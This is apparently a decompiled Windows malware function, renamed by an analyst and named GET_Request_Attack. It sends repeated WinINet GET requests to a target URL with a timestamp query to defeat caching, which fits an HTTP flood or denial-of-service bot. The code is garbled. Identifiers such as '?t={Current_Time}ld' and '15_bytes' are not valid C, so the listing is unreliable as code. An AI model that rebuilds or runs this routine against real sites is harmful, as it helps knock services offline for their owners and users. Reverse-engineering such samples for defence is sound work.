undefined8 GET_Request_Attack(char *target_addr) {
  int get_File;
  undefined8 Current_Time;
  size_t len_of_first_instruction;
  size_t len_of_current_time_string;
  undefined file_buffer [28];
  uint 15_bytes;
  char ?t={Current_Time}ld [28];
  undefined4 INTERNET_OPTION_SETTINGS_CHANGED;
  char *combine_instruction_with_time;
  size_t local_30;
  longlong established_connection;
  longlong internet_session;
  
  internet_session = 0;
  established_connection = 0;
  Current_Time = GET_TIME((__time64_t *)0x0);
  sprintf(?t={Current_Time}ld,"?t=%ld",Current_Time);
  len_of_first_instruction = strlen(target_addr);
  len_of_current_time_string = strlen(?t={Current_Time}ld);
  local_30 = len_of_current_time_string + len_of_first_instruction + 1;
  combine_instruction_with_time = (char *)malloc(local_30);
  strcpy(combine_instruction_with_time,target_addr);
  strcat(combine_instruction_with_time,?t={Current_Time}ld);
  internet_session = InternetOpenA(0,1,0,0,0);
  if (internet_session == 0)
    Current_Time = 0;
  else {
    established_connection = InternetOpenUrlA(internet_session,combine_instruction_with_time,0,0,0x2000,0);
    if (established_connection == 0)
      Current_Time = 0;
    else {
      15_bytes = 0;
      while( true ) {
        get_File = InternetReadFile(established_connection,file_buffer,0xf,&15_bytes);
        if ((get_File == 0) || (15_bytes == 0)) break;
        file_buffer[15_bytes] = 0;
      }
      get_File = InternetReadFile(established_connection,file_buffer,0x10,&15_bytes);
      if (get_File == 0)
        Current_Time = 0;
      else {
        memset(file_buffer,0,0x10);
        INTERNET_OPTION_SETTINGS_CHANGED = InternetSetOptionA(0,0x27,0,0);
        InternetCloseHandle(established_connection);
        Current_Time = InternetCloseHandle(internet_session);
      }
    }
  }
  return Current_Time;
}
